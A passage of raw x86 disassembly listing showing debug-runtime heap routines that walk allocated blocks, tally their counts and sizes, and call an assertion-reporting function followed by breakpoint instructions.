  4069a4:	75 cd                	jne    0x406973
  4069a6:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  4069ad:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4069b0:	83 7a 14 00          	cmpl   $0x0,0x14(%edx)
  4069b4:	75 50                	jne    0x406a06
  4069b6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4069b9:	8b 48 10             	mov    0x10(%eax),%ecx
  4069bc:	51                   	push   %ecx
  4069bd:	8a 15 95 b1 45 00    	mov    0x45b195,%dl
  4069c3:	52                   	push   %edx
  4069c4:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4069c7:	83 c0 20             	add    $0x20,%eax
  4069ca:	50                   	push   %eax
  4069cb:	e8 c0 fc ff ff       	call   0x406690
  4069d0:	83 c4 0c             	add    $0xc,%esp
  4069d3:	85 c0                	test   %eax,%eax
  4069d5:	75 2f                	jne    0x406a06
  4069d7:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4069da:	83 c1 20             	add    $0x20,%ecx
  4069dd:	51                   	push   %ecx
  4069de:	68 20 f8 40 00       	push   $0x40f820
  4069e3:	6a 00                	push   $0x0
  4069e5:	6a 00                	push   $0x0
  4069e7:	6a 00                	push   $0x0
  4069e9:	6a 00                	push   $0x0
  4069eb:	e8 d0 2b 00 00       	call   0x4095c0
  4069f0:	83 c4 18             	add    $0x18,%esp
  4069f3:	83 f8 01             	cmp    $0x1,%eax
  4069f6:	75 01                	jne    0x4069f9
  4069f8:	cc                   	int3
  4069f9:	33 d2                	xor    %edx,%edx
  4069fb:	85 d2                	test   %edx,%edx
  4069fd:	75 d8                	jne    0x4069d7
  4069ff:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  406a06:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  406a0a:	75 76                	jne    0x406a82
  406a0c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406a0f:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  406a13:	74 33                	je     0x406a48
  406a15:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406a18:	8b 51 0c             	mov    0xc(%ecx),%edx
  406a1b:	52                   	push   %edx
  406a1c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406a1f:	8b 48 08             	mov    0x8(%eax),%ecx
  406a22:	51                   	push   %ecx
  406a23:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  406a26:	52                   	push   %edx
  406a27:	68 00 f8 40 00       	push   $0x40f800
  406a2c:	6a 00                	push   $0x0
  406a2e:	6a 00                	push   $0x0
  406a30:	6a 00                	push   $0x0
  406a32:	6a 00                	push   $0x0
  406a34:	e8 87 2b 00 00       	call   0x4095c0
  406a39:	83 c4 20             	add    $0x20,%esp
  406a3c:	83 f8 01             	cmp    $0x1,%eax
  406a3f:	75 01                	jne    0x406a42
  406a41:	cc                   	int3
  406a42:	33 c0                	xor    %eax,%eax
  406a44:	85 c0                	test   %eax,%eax
  406a46:	75 cd                	jne    0x406a15
  406a48:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406a4b:	8b 51 10             	mov    0x10(%ecx),%edx
  406a4e:	52                   	push   %edx
  406a4f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406a52:	83 c0 20             	add    $0x20,%eax
  406a55:	50                   	push   %eax
  406a56:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  406a59:	51                   	push   %ecx
  406a5a:	68 d4 f7 40 00       	push   $0x40f7d4
  406a5f:	6a 00                	push   $0x0
  406a61:	6a 00                	push   $0x0
  406a63:	6a 00                	push   $0x0
  406a65:	6a 00                	push   $0x0
  406a67:	e8 54 2b 00 00       	call   0x4095c0
  406a6c:	83 c4 20             	add    $0x20,%esp
  406a6f:	83 f8 01             	cmp    $0x1,%eax
  406a72:	75 01                	jne    0x406a75
  406a74:	cc                   	int3
  406a75:	33 d2                	xor    %edx,%edx
  406a77:	85 d2                	test   %edx,%edx
  406a79:	75 cd                	jne    0x406a48
  406a7b:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  406a82:	e9 08 fe ff ff       	jmp    0x40688f
  406a87:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  406a8e:	e8 02 00 00 00       	call   0x406a95
  406a93:	eb 0b                	jmp    0x406aa0
  406a95:	6a 09                	push   $0x9
  406a97:	e8 74 ca ff ff       	call   0x403510
  406a9c:	83 c4 04             	add    $0x4,%esp
  406a9f:	c3                   	ret
  406aa0:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406aa3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406aa6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406aad:	5f                   	pop    %edi
  406aae:	5e                   	pop    %esi
  406aaf:	5b                   	pop    %ebx
  406ab0:	8b e5                	mov    %ebp,%esp
  406ab2:	5d                   	pop    %ebp
  406ab3:	c3                   	ret
  406ab4:	24 68                	and    $0x68,%al
  406ab6:	40                   	inc    %eax
  406ab7:	00 fc                	add    %bh,%ah
  406ab9:	67 40                	addr16 inc %eax
  406abb:	00 d4                	add    %dl,%ah
  406abd:	67 40                	addr16 inc %eax
  406abf:	00 a9 67 40 00 cc    	add    %ch,-0x33ffbf99(%ecx)
  406ac5:	cc                   	int3
  406ac6:	cc                   	int3
  406ac7:	cc                   	int3
  406ac8:	cc                   	int3
  406ac9:	cc                   	int3
  406aca:	cc                   	int3
  406acb:	cc                   	int3
  406acc:	cc                   	int3
  406acd:	cc                   	int3
  406ace:	cc                   	int3
  406acf:	cc                   	int3
  406ad0:	55                   	push   %ebp
  406ad1:	8b ec                	mov    %esp,%ebp
  406ad3:	51                   	push   %ecx
  406ad4:	a1 88 b1 45 00       	mov    0x45b188,%eax
  406ad9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406adc:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  406ae0:	74 09                	je     0x406aeb
  406ae2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406ae5:	89 0d 88 b1 45 00    	mov    %ecx,0x45b188
  406aeb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406aee:	8b e5                	mov    %ebp,%esp
  406af0:	5d                   	pop    %ebp
  406af1:	c3                   	ret
  406af2:	cc                   	int3
  406af3:	cc                   	int3
  406af4:	cc                   	int3
  406af5:	cc                   	int3
  406af6:	cc                   	int3
  406af7:	cc                   	int3
  406af8:	cc                   	int3
  406af9:	cc                   	int3
  406afa:	cc                   	int3
  406afb:	cc                   	int3
  406afc:	cc                   	int3
  406afd:	cc                   	int3
  406afe:	cc                   	int3
  406aff:	cc                   	int3
  406b00:	55                   	push   %ebp
  406b01:	8b ec                	mov    %esp,%ebp
  406b03:	51                   	push   %ecx
  406b04:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406b08:	74 33                	je     0x406b3d
  406b0a:	8b 45 0c             	mov    0xc(%ebp),%eax
  406b0d:	50                   	push   %eax
  406b0e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406b11:	51                   	push   %ecx
  406b12:	ff 15 a8 f0 40 00    	call   *0x40f0a8
  406b18:	85 c0                	test   %eax,%eax
  406b1a:	75 21                	jne    0x406b3d
  406b1c:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406b20:	74 12                	je     0x406b34
  406b22:	8b 55 0c             	mov    0xc(%ebp),%edx
  406b25:	52                   	push   %edx
  406b26:	8b 45 08             	mov    0x8(%ebp),%eax
  406b29:	50                   	push   %eax
  406b2a:	ff 15 a4 f0 40 00    	call   *0x40f0a4
  406b30:	85 c0                	test   %eax,%eax
  406b32:	75 09                	jne    0x406b3d
  406b34:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  406b3b:	eb 07                	jmp    0x406b44
  406b3d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406b44:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b47:	8b e5                	mov    %ebp,%esp
  406b49:	5d                   	pop    %ebp
  406b4a:	c3                   	ret
  406b4b:	cc                   	int3
  406b4c:	cc                   	int3
  406b4d:	cc                   	int3
  406b4e:	cc                   	int3
  406b4f:	cc                   	int3
  406b50:	55                   	push   %ebp
  406b51:	8b ec                	mov    %esp,%ebp
  406b53:	83 ec 10             	sub    $0x10,%esp
  406b56:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406b5a:	75 07                	jne    0x406b63
  406b5c:	33 c0                	xor    %eax,%eax
  406b5e:	e9 0d 01 00 00       	jmp    0x406c70
  406b63:	6a 01                	push   $0x1
  406b65:	6a 20                	push   $0x20
  406b67:	8b 45 08             	mov    0x8(%ebp),%eax
  406b6a:	83 e8 20             	sub    $0x20,%eax
  406b6d:	50                   	push   %eax
  406b6e:	e8 8d ff ff ff       	call   0x406b00
  406b73:	83 c4 0c             	add    $0xc,%esp
  406b76:	85 c0                	test   %eax,%eax
  406b78:	75 07                	jne    0x406b81
  406b7a:	33 c0                	xor    %eax,%eax
  406b7c:	e9 ef 00 00 00       	jmp    0x406c70
  406b81:	83 3d 50 f2 45 00 03 	cmpl   $0x3,0x45f250
  406b88:	75 64                	jne    0x406bee
  406b8a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406b8d:	83 e9 20             	sub    $0x20,%ecx
  406b90:	51                   	push   %ecx
  406b91:	e8 aa 07 00 00       	call   0x407340
  406b96:	83 c4 04             	add    $0x4,%esp
  406b99:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406b9c:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406ba0:	74 18                	je     0x406bba
  406ba2:	8b 55 08             	mov    0x8(%ebp),%edx
  406ba5:	83 ea 20             	sub    $0x20,%edx
  406ba8:	52                   	push   %edx
  406ba9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406bac:	50                   	push   %eax
  406bad:	e8 ee 07 00 00       	call   0x4073a0
  406bb2:	83 c4 08             	add    $0x8,%esp
  406bb5:	e9 b6 00 00 00       	jmp    0x406c70
  406bba:	8b 0d e0 dc 45 00    	mov    0x45dce0,%ecx
  406bc0:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  406bc6:	85 c9                	test   %ecx,%ecx
  406bc8:	74 0a                	je     0x406bd4
  406bca:	b8 01 00 00 00       	mov    $0x1,%eax
  406bcf:	e9 9c 00 00 00       	jmp    0x406c70
  406bd4:	8b 55 08             	mov    0x8(%ebp),%edx
  406bd7:	83 ea 20             	sub    $0x20,%edx
  406bda:	52                   	push   %edx
  406bdb:	6a 00                	push   $0x0
  406bdd:	a1 4c f2 45 00       	mov    0x45f24c,%eax
  406be2:	50                   	push   %eax
  406be3:	ff 15 ac f0 40 00    	call   *0x40f0ac
  406be9:	e9 82 00 00 00       	jmp    0x406c70
  406bee:	83 3d 50 f2 45 00 02 	cmpl   $0x2,0x45f250
  406bf5:	75 63                	jne    0x406c5a
  406bf7:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  406bfa:	51                   	push   %ecx
  406bfb:	8d 55 f0             	lea    -0x10(%ebp),%edx
  406bfe:	52                   	push   %edx
  406bff:	8b 45 08             	mov    0x8(%ebp),%eax
  406c02:	83 e8 20             	sub    $0x20,%eax
  406c05:	50                   	push   %eax
  406c06:	e8 f5 1f 00 00       	call   0x408c00
  406c0b:	83 c4 0c             	add    $0xc,%esp
  406c0e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c11:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  406c15:	74 16                	je     0x406c2d
  406c17:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406c1a:	33 d2                	xor    %edx,%edx
  406c1c:	8a 11                	mov    (%ecx),%dl
  406c1e:	85 d2                	test   %edx,%edx
  406c20:	74 07                	je     0x406c29
  406c22:	b8 01 00 00 00       	mov    $0x1,%eax
  406c27:	eb 47                	jmp    0x406c70
  406c29:	33 c0                	xor    %eax,%eax
  406c2b:	eb 43                	jmp    0x406c70
  406c2d:	a1 e0 dc 45 00       	mov    0x45dce0,%eax
  406c32:	25 00 80 00 00       	and    $0x8000,%eax
  406c37:	85 c0                	test   %eax,%eax
  406c39:	74 07                	je     0x406c42
  406c3b:	b8 01 00 00 00       	mov    $0x1,%eax
  406c40:	eb 2e                	jmp    0x406c70
  406c42:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406c45:	83 e9 20             	sub    $0x20,%ecx
  406c48:	51                   	push   %ecx
  406c49:	6a 00                	push   $0x0
  406c4b:	8b 15 4c f2 45 00    	mov    0x45f24c,%edx
  406c51:	52                   	push   %edx
  406c52:	ff 15 ac f0 40 00    	call   *0x40f0ac
  406c58:	eb 16                	jmp    0x406c70
  406c5a:	8b 45 08             	mov    0x8(%ebp),%eax
  406c5d:	83 e8 20             	sub    $0x20,%eax
  406c60:	50                   	push   %eax
  406c61:	6a 00                	push   $0x0
  406c63:	8b 0d 4c f2 45 00    	mov    0x45f24c,%ecx
  406c69:	51                   	push   %ecx
  406c6a:	ff 15 ac f0 40 00    	call   *0x40f0ac
  406c70:	8b e5                	mov    %ebp,%esp
  406c72:	5d                   	pop    %ebp
  406c73:	c3                   	ret
  406c74:	cc                   	int3
  406c75:	cc                   	int3
  406c76:	cc                   	int3
  406c77:	cc                   	int3
  406c78:	cc                   	int3
  406c79:	cc                   	int3
  406c7a:	cc                   	int3
  406c7b:	cc                   	int3
  406c7c:	cc                   	int3
  406c7d:	cc                   	int3
  406c7e:	cc                   	int3
  406c7f:	cc                   	int3
  406c80:	55                   	push   %ebp
  406c81:	8b ec                	mov    %esp,%ebp
  406c83:	6a ff                	push   $0xffffffff
  406c85:	68 68 f9 40 00       	push   $0x40f968
  406c8a:	68 f8 5a 40 00       	push   $0x405af8
  406c8f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406c95:	50                   	push   %eax
  406c96:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  406c9d:	83 c4 f0             	add    $0xfffffff0,%esp
  406ca0:	53                   	push   %ebx
  406ca1:	56                   	push   %esi
  406ca2:	57                   	push   %edi
  406ca3:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406ca7:	75 2b                	jne    0x406cd4
  406ca9:	68 40 f9 40 00       	push   $0x40f940
  406cae:	68 e4 f5 40 00       	push   $0x40f5e4
  406cb3:	6a 00                	push   $0x0
  406cb5:	6a 00                	push   $0x0
  406cb7:	6a 00                	push   $0x0
  406cb9:	6a 00                	push   $0x0
  406cbb:	e8 00 29 00 00       	call   0x4095c0
  406cc0:	83 c4 18             	add    $0x18,%esp
  406cc3:	83 f8 01             	cmp    $0x1,%eax
  406cc6:	75 01                	jne    0x406cc9
  406cc8:	cc                   	int3
  406cc9:	33 c0                	xor    %eax,%eax
  406ccb:	85 c0                	test   %eax,%eax
  406ccd:	75 da                	jne    0x406ca9
  406ccf:	e9 3f 01 00 00       	jmp    0x406e13
  406cd4:	6a 09                	push   $0x9
  406cd6:	e8 95 c7 ff ff       	call   0x403470
  406cdb:	83 c4 04             	add    $0x4,%esp
  406cde:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406ce5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406ce8:	8b 15 38 de 45 00    	mov    0x45de38,%edx
  406cee:	89 11                	mov    %edx,(%ecx)
  406cf0:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  406cf7:	eb 09                	jmp    0x406d02
  406cf9:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406cfc:	83 c0 01             	add    $0x1,%eax
  406cff:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406d02:	83 7d e4 05          	cmpl   $0x5,-0x1c(%ebp)
  406d06:	7d 1e                	jge    0x406d26
  406d08:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  406d0b:	8b 55 08             	mov    0x8(%ebp),%edx
  406d0e:	c7 44 8a 18 00 00 00 	movl   $0x0,0x18(%edx,%ecx,4)
  406d15:	00 
  406d16:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406d19:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d1c:	c7 44 81 04 00 00 00 	movl   $0x0,0x4(%ecx,%eax,4)
  406d23:	00 
  406d24:	eb d3                	jmp    0x406cf9
  406d26:	8b 15 38 de 45 00    	mov    0x45de38,%edx
  406d2c:	89 55 e0             	mov    %edx,-0x20(%ebp)
  406d2f:	eb 08                	jmp    0x406d39
  406d31:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406d34:	8b 08                	mov    (%eax),%ecx
  406d36:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  406d39:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  406d3d:	0f 84 9f 00 00 00    	je     0x406de2
  406d43:	8b 55 e0             	mov    -0x20(%ebp),%edx
  406d46:	8b 42 14             	mov    0x14(%edx),%eax
  406d49:	25 ff ff 00 00       	and    $0xffff,%eax
  406d4e:	85 c0                	test   %eax,%eax
  406d50:	7c 66                	jl     0x406db8
  406d52:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406d55:	8b 51 14             	mov    0x14(%ecx),%edx
  406d58:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  406d5e:	83 fa 05             	cmp    $0x5,%edx
  406d61:	7d 55                	jge    0x406db8
  406d63:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406d66:	8b 48 14             	mov    0x14(%eax),%ecx
  406d69:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  406d6f:	8b 55 08             	mov    0x8(%ebp),%edx
  406d72:	8b 44 8a 04          	mov    0x4(%edx,%ecx,4),%eax
  406d76:	83 c0 01             	add    $0x1,%eax
  406d79:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406d7c:	8b 51 14             	mov    0x14(%ecx),%edx
  406d7f:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  406d85:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d88:	89 44 91 04          	mov    %eax,0x4(%ecx,%edx,4)
  406d8c:	8b 55 e0             	mov    -0x20(%ebp),%edx
  406d8f:	8b 42 14             	mov    0x14(%edx),%eax
  406d92:	25 ff ff 00 00       	and    $0xffff,%eax
  406d97:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d9a:	8b 54 81 18          	mov    0x18(%ecx,%eax,4),%edx
  406d9e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406da1:	03 50 10             	add    0x10(%eax),%edx
  406da4:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406da7:	8b 41 14             	mov    0x14(%ecx),%eax
  406daa:	25 ff ff 00 00       	and    $0xffff,%eax
  406daf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406db2:	89 54 81 18          	mov    %edx,0x18(%ecx,%eax,4)
  406db6:	eb 25                	jmp    0x406ddd
  406db8:	8b 55 e0             	mov    -0x20(%ebp),%edx
  406dbb:	52                   	push   %edx
  406dbc:	68 1c f9 40 00       	push   $0x40f91c
  406dc1:	6a 00                	push   $0x0
  406dc3:	6a 00                	push   $0x0
  406dc5:	6a 00                	push   $0x0
  406dc7:	6a 00                	push   $0x0
  406dc9:	e8 f2 27 00 00       	call   0x4095c0
  406dce:	83 c4 18             	add    $0x18,%esp
  406dd1:	83 f8 01             	cmp    $0x1,%eax
  406dd4:	75 01                	jne    0x406dd7
  406dd6:	cc                   	int3
  406dd7:	33 c0                	xor    %eax,%eax
  406dd9:	85 c0                	test   %eax,%eax
  406ddb:	75 db                	jne    0x406db8
  406ddd:	e9 4f ff ff ff       	jmp    0x406d31
  406de2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406de5:	8b 15 40 de 45 00    	mov    0x45de40,%edx
  406deb:	89 51 2c             	mov    %edx,0x2c(%ecx)
  406dee:	8b 45 08             	mov    0x8(%ebp),%eax
  406df1:	8b 0d 34 de 45 00    	mov    0x45de34,%ecx
  406df7:	89 48 30             	mov    %ecx,0x30(%eax)
  406dfa:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  406e01:	e8 02 00 00 00       	call   0x406e08
  406e06:	eb 0b                	jmp    0x406e13
  406e08:	6a 09                	push   $0x9
  406e0a:	e8 01 c7 ff ff       	call   0x403510
  406e0f:	83 c4 04             	add    $0x4,%esp
  406e12:	c3                   	ret
  406e13:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406e16:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406e1d:	5f                   	pop    %edi
  406e1e:	5e                   	pop    %esi
  406e1f:	5b                   	pop    %ebx
  406e20:	8b e5                	mov    %ebp,%esp
  406e22:	5d                   	pop    %ebp
  406e23:	c3                   	ret
  406e24:	cc                   	int3
  406e25:	cc                   	int3
  406e26:	cc                   	int3
  406e27:	cc                   	int3
  406e28:	cc                   	int3
  406e29:	cc                   	int3
  406e2a:	cc                   	int3
  406e2b:	cc                   	int3
  406e2c:	cc                   	int3
  406e2d:	cc                   	int3
  406e2e:	cc                   	int3
  406e2f:	cc                   	int3
  406e30:	55                   	push   %ebp
  406e31:	8b ec                	mov    %esp,%ebp
  406e33:	6a ff                	push   $0xffffffff
  406e35:	68 58 fa 40 00       	push   $0x40fa58
  406e3a:	68 f8 5a 40 00       	push   $0x405af8
  406e3f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406e45:	50                   	push   %eax
  406e46:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  406e4d:	83 c4 f0             	add    $0xfffffff0,%esp
  406e50:	53                   	push   %ebx
  406e51:	56                   	push   %esi
  406e52:	57                   	push   %edi
  406e53:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  406e5a:	6a 09                	push   $0x9
  406e5c:	e8 0f c6 ff ff       	call   0x403470
  406e61:	83 c4 04             	add    $0x4,%esp
  406e64:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406e6b:	68 44 fa 40 00       	push   $0x40fa44
  406e70:	68 e4 f5 40 00       	push   $0x40f5e4
  406e75:	6a 00                	push   $0x0
  406e77:	6a 00                	push   $0x0
  406e79:	6a 00                	push   $0x0
  406e7b:	6a 00                	push   $0x0
  406e7d:	e8 3e 27 00 00       	call   0x4095c0
  406e82:	83 c4 18             	add    $0x18,%esp
  406e85:	83 f8 01             	cmp    $0x1,%eax
  406e88:	75 01                	jne    0x406e8b
  406e8a:	cc                   	int3
  406e8b:	33 c0                	xor    %eax,%eax
  406e8d:	85 c0                	test   %eax,%eax
  406e8f:	75 da                	jne    0x406e6b
  406e91:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406e95:	74 08                	je     0x406e9f
  406e97:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406e9a:	8b 11                	mov    (%ecx),%edx
  406e9c:	89 55 e0             	mov    %edx,-0x20(%ebp)
  406e9f:	a1 38 de 45 00       	mov    0x45de38,%eax
  406ea4:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406ea7:	eb 08                	jmp    0x406eb1
  406ea9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  406eac:	8b 11                	mov    (%ecx),%edx
  406eae:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  406eb1:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  406eb5:	0f 84 18 02 00 00    	je     0x4070d3
  406ebb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406ebe:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  406ec1:	0f 84 0c 02 00 00    	je     0x4070d3
  406ec7:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  406eca:	8b 51 14             	mov    0x14(%ecx),%edx
  406ecd:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  406ed3:	83 fa 03             	cmp    $0x3,%edx
  406ed6:	74 2d                	je     0x406f05
  406ed8:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406edb:	8b 48 14             	mov    0x14(%eax),%ecx
  406ede:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  406ee4:	85 c9                	test   %ecx,%ecx
  406ee6:	74 1d                	je     0x406f05
  406ee8:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  406eeb:	8b 42 14             	mov    0x14(%edx),%eax
  406eee:	25 ff ff 00 00       	and    $0xffff,%eax
  406ef3:	83 f8 02             	cmp    $0x2,%eax
  406ef6:	75 12                	jne    0x406f0a
  406ef8:	8b 0d 88 b1 45 00    	mov    0x45b188,%ecx
  406efe:	83 e1 10             	and    $0x10,%ecx
  406f01:	85 c9                	test   %ecx,%ecx
  406f03:	75 05                	jne    0x406f0a
  406f05:	e9 c4 01 00 00       	jmp    0x4070ce
  406f0a:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  406f0d:	83 7a 08 00          	cmpl   $0x0,0x8(%edx)
  406f11:	74 70                	je     0x406f83
  406f13:	6a 00                	push   $0x0
  406f15:	6a 01                	push   $0x1
  406f17:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406f1a:	8b 48 08             	mov    0x8(%eax),%ecx
  406f1d:	51                   	push   %ecx
  406f1e:	e8 dd fb ff ff       	call   0x406b00
  406f23:	83 c4 0c             	add    $0xc,%esp
  406f26:	85 c0                	test   %eax,%eax
  406f28:	75 2a                	jne    0x406f54
  406f2a:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  406f2d:	8b 42 0c             	mov    0xc(%edx),%eax
  406f30:	50                   	push   %eax
  406f31:	68 30 fa 40 00       	push   $0x40fa30
  406f36:	6a 00                	push   $0x0
  406f38:	6a 00                	push   $0x0
  406f3a:	6a 00                	push   $0x0
  406f3c:	6a 00                	push   $0x0
  406f3e:	e8 7d 26 00 00       	call   0x4095c0
  406f43:	83 c4 18             	add    $0x18,%esp
  406f46:	83 f8 01             	cmp    $0x1,%eax
  406f49:	75 01                	jne    0x406f4c
  406f4b:	cc                   	int3
  406f4c:	33 c9                	xor    %ecx,%ecx
  406f4e:	85 c9                	test   %ecx,%ecx
  406f50:	75 d8                	jne    0x406f2a
  406f52:	eb 2f                	jmp    0x406f83
  406f54:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  406f57:	8b 42 0c             	mov    0xc(%edx),%eax
  406f5a:	50                   	push   %eax
  406f5b:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  406f5e:	8b 51 08             	mov    0x8(%ecx),%edx
  406f61:	52                   	push   %edx
  406f62:	68 24 fa 40 00       	push   $0x40fa24
  406f67:	6a 00                	push   $0x0
  406f69:	6a 00                	push   $0x0
  406f6b:	6a 00                	push   $0x0
  406f6d:	6a 00                	push   $0x0
  406f6f:	e8 4c 26 00 00       	call   0x4095c0
  406f74:	83 c4 1c             	add    $0x1c,%esp
  406f77:	83 f8 01             	cmp    $0x1,%eax
  406f7a:	75 01                	jne    0x406f7d
  406f7c:	cc                   	int3
  406f7d:	33 c0                	xor    %eax,%eax
  406f7f:	85 c0                	test   %eax,%eax
  406f81:	75 d1                	jne    0x406f54
  406f83:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  406f86:	8b 51 18             	mov    0x18(%ecx),%edx
  406f89:	52                   	push   %edx
  406f8a:	68 1c fa 40 00       	push   $0x40fa1c
  406f8f:	6a 00                	push   $0x0
  406f91:	6a 00                	push   $0x0
  406f93:	6a 00                	push   $0x0
  406f95:	6a 00                	push   $0x0
  406f97:	e8 24 26 00 00       	call   0x4095c0
  406f9c:	83 c4 18             	add    $0x18,%esp
  406f9f:	83 f8 01             	cmp    $0x1,%eax
  406fa2:	75 01                	jne    0x406fa5
  406fa4:	cc                   	int3
  406fa5:	33 c0                	xor    %eax,%eax
  406fa7:	85 c0                	test   %eax,%eax
  406fa9:	75 d8                	jne    0x406f83
  406fab:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  406fae:	8b 51 14             	mov    0x14(%ecx),%edx
  406fb1:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  406fb7:	83 fa 04             	cmp    $0x4,%edx
  406fba:	75 71                	jne    0x40702d
  406fbc:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406fbf:	8b 48 10             	mov    0x10(%eax),%ecx
  406fc2:	51                   	push   %ecx
  406fc3:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  406fc6:	8b 42 14             	mov    0x14(%edx),%eax
  406fc9:	c1 f8 10             	sar    $0x10,%eax
  406fcc:	25 ff ff 00 00       	and    $0xffff,%eax
  406fd1:	50                   	push   %eax
  406fd2:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  406fd5:	83 c1 20             	add    $0x20,%ecx
  406fd8:	51                   	push   %ecx
  406fd9:	68 e8 f9 40 00       	push   $0x40f9e8
  406fde:	6a 00                	push   $0x0
  406fe0:	6a 00                	push   $0x0
  406fe2:	6a 00                	push   $0x0
  406fe4:	6a 00                	push   $0x0
  406fe6:	e8 d5 25 00 00       	call   0x4095c0
  406feb:	83 c4 20             	add    $0x20,%esp
  406fee:	83 f8 01             	cmp    $0x1,%eax
  406ff1:	75 01                	jne    0x406ff4
  406ff3:	cc                   	int3
  406ff4:	33 d2                	xor    %edx,%edx
  406ff6:	85 d2                	test   %edx,%edx
  406ff8:	75 c2                	jne    0x406fbc
  406ffa:	83 3d 48 f2 45 00 00 	cmpl   $0x0,0x45f248
  407001:	74 19                	je     0x40701c
  407003:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407006:	8b 48 10             	mov    0x10(%eax),%ecx
  407009:	51                   	push   %ecx
  40700a:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40700d:	83 c2 20             	add    $0x20,%edx
  407010:	52                   	push   %edx
